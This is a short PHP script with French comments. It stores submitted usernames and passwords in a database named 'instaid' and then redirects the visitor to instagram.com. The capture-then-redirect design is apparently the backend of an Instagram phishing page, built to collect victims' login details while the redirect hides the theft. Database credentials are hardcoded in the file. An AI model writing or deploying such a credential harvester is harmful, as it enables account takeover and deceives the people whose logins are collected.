<?php
// Connexion à la base de données (à adapter selon vos paramètres)
$servername = "localhost";
$username = "manon";
$password = "toto";
$dbname = "instaid";

$bdd = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);

// Vérification de la connexion
if (!$bdd) {
    die("La connexion a échoué.");
}

// Vérification si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Utilisation des requêtes préparées pour éviter les injections SQL
    $stmt = $bdd->prepare("INSERT INTO utilisateurs (identifiant, mot_de_passe) VALUES (?, ?)");
    if (!$stmt) {
        die("Erreur de préparation de la requête : " . $bdd->errorInfo()[2]);
    }

    // Récupération des données du formulaire
    $identifiant = $_POST["username"];
    $mot_de_passe = password_hash($_POST["password"], PASSWORD_DEFAULT); // Utilisation de password_hash pour sécuriser le mot de passe

    // Exécution de la requête préparée
    if ($stmt->execute([$identifiant, $mot_de_passe])) {
        // Redirection vers https://www.instagram.com/
        header("Location: https://www.instagram.com/");
        exit(); // Assurez-vous de terminer l'exécution du script après la redirection
    } else {
        echo "Erreur lors de l'enregistrement : " . $stmt->errorInfo()[2];
    }

    // Fermeture de la requête
    $stmt->closeCursor();
}

// Fermeture de la connexion à la base de données
$bdd = null;
?>